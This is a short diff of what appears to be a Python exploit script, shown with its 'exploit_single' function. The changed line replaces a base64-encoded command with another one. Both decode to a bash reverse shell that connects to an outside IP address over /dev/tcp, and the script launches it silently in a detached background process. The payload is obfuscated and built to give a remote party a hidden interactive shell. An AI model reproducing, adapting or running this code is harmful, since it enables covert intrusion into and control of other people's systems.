@@ -189,7 +189,7 @@ def exploit_single(target, mode):
 
     return result
 
-cmd_b64 = "bm9odXAgYmFzaCAtYyAnKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzE0Ni43MC4yNDAuMjA2LzYwOTIwIDA+JjEpICAn"
+cmd_b64 = "YmFzaCAtYyAnKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzE0Ni43MC4yNDAuMjA2LzUzNzMyIDA+JjEpICYn"
 cmd = base64.b64decode(cmd_b64).decode()
 
 subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
